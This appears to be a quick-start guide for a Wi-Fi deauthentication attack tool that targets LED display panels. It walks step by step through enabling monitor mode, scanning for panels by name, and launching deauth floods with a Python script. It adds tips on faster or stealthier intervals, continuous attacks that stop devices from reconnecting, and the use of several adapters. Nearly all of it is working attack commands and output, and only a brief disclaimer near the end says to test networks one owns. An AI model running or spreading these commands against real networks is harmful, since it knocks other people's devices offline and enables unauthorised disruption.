# Quick Start Guide - Kali Linux Edition

## 🚀 Fast Setup for Kali Linux

### Prerequisites Check
```bash
# Verify you're on Kali Linux
cat /etc/os-release | grep -i kali

# Check Python
python3 --version

# Check aircrack-ng
airmon-ng --version
```

### Quick Installation
```bash
# Install dependencies
pip3 install scapy

# Or from requirements
pip3 install -r requirements.txt
```

---

## 📋 Complete Workflow (5 Steps)

### Step 1: Find Your WiFi Interface
```bash
iwconfig
```
Look for your adapter (usually `wlan0` or `wlan1`)

### Step 2: Enable Monitor Mode
```bash
# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0
```
**Note:** This creates a new interface like `wlan0mon`

### Step 3: Find Your LED Panel
```bash
sudo python3 find_led_panel.py wlan0mon 30
```
**Look for:**
- Networks with "LED", "Panel", "Display", "Climate", "Change" in name
- Strong signal strength
- **Copy the BSSID (MAC address)**

### Step 4: Launch Attack
```bash
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID>
```
Replace `<BSSID>` with the MAC address from Step 3

**Example:**
```bash
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF
```

### Step 5: Stop & Cleanup
```bash
# Press Ctrl+C to stop attack

# Restore managed mode
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## 🎯 One-Liner Commands

### Quick Scan
```bash
sudo python3 deauth_attack.py --scan -i wlan0mon
```

### Quick Attack (Replace BSSID)
```bash
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF
```

### Auto Setup + Scan
```bash
sudo python3 deauth_attack.py --monitor --scan -i wlan0
```

---

## 🔧 Advanced Options

### Faster Attack (More Aggressive)
```bash
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID> --interval 0.01
```

### Slower Attack (More Stealthy)
```bash
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID> --interval 0.5
```

### Limited Packets (Test Run)
```bash
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID> -n 100
```

### Targeted Client Attack
```bash
sudo python3 deauth_attack.py -i wlan0mon -t <AP_BSSID> -c <CLIENT_BSSID>
```

---

## 🐛 Troubleshooting

### Interface Not Found
```bash
# Check interfaces
iwconfig
ip link show

# Try different names
sudo python3 deauth_attack.py --scan -i wlan1mon
```

### Permission Denied
```bash
# Always use sudo
sudo python3 deauth_attack.py -i wlan0mon -t <BSSID>
```

### No Networks Found
```bash
# Check monitor mode
iwconfig | grep Mode
# Should show: Mode:Monitor

# Scan longer
sudo python3 find_led_panel.py wlan0mon 60
```

### Monitor Mode Not Working
```bash
# Kill processes
sudo airmon-ng check kill

# Try again
sudo airmon-ng start wlan0

# Check support
sudo iw list | grep monitor
```

---

## 📊 Understanding Output

### During Scan:
```
[+] Found: LED-Panel-123 - AA:BB:CC:DD:EE:FF
[+] Found: ClimateChange - 11:22:33:44:55:66
```

### During Attack:
```
[*] Starting deauthentication attack...
[*] Target AP: AA:BB:CC:DD:EE:FF
[*] Sent 100 deauth packets...
[*] Sent 200 deauth packets...
```

---

## ⚡ Pro Tips

1. **Distance Matters**: Closer to LED panel = more effective
2. **Signal Strength**: Stronger signal = better results
3. **Continuous Attack**: Keep running to prevent reconnection
4. **Multiple Adapters**: Use multiple adapters for stronger attacks
5. **Channel Lock**: Set interface to LED panel's channel for better results

---

## 🔒 Security & Legal

⚠️ **ONLY USE ON NETWORKS YOU OWN OR HAVE PERMISSION TO TEST**

Unauthorized use is illegal and can result in:
- Criminal charges
- Civil lawsuits
- Fines and penalties

---

## 📝 Common Workflow

```bash
# 1. Check adapter
iwconfig

# 2. Enable monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 3. Scan
sudo python3 find_led_panel.py wlan0mon 30

# 4. Attack (replace BSSID)
sudo python3 deauth_attack.py -i wlan0mon -t AA:BB:CC:DD:EE:FF

# 5. Stop (Ctrl+C)

# 6. Cleanup
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## 🆘 Quick Help

| Problem | Solution |
|---------|----------|
| Interface not found | Run `iwconfig` to find interface |
| Permission denied | Use `sudo` |
| No networks | Check monitor mode, scan longer |
| Monitor mode fails | Run `sudo airmon-ng check kill` first |
| Attack not working | Check BSSID, verify signal strength |

---

## 📚 More Information

- See `README.md` for detailed documentation
- Check adapter compatibility: `sudo iw list`
- Verify tools: `airmon-ng --version`

---

**Ready to go? Start with Step 1!** 🚀
